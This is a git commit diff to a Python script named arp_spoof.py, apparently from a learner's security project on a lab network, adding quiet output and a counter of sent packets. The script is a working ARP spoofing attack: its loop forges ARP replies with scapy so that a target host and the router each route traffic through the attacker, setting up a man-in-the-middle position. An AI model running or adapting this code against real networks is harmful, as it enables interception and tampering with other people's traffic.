3ac3af8fa7e56cd19ca3c2450c59fd6dfba083fd
iskry <refocuslucifer@protonmail.com>
2023-08-20 21:46:15 -0400

    update function output. added counter to count packets upon each loop iteration

--- arp_spoof.py
+++ arp_spoof.py
@@ -22,7 +22,9 @@ def spoof(target_ip, spoof_ip):
     target_mac = get_mac(target_ip)
     #op is set to 2 which is for ARP response. the default option, 1, is for ARP request
     packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
-    scapy.send(packet)
+    scapy.send(packet, verbose=False)
+
+sent_packets_count = 0
 
 # loop will continue to execute until user uses shortcut "ctrl+c"
 while True:
@@ -30,5 +32,7 @@ while True:
     spoof("192.168.122.11", "192.168.122.1")
 # spoofs target to router
     spoof("192.168.122.1", "192.168.122.11")
+    sent_packets_count = sent_packets_count + 2
+    print("[+] Packets sent: " + str(sent_packets_count))
     # delays next iteration of loop
     time.sleep(2)
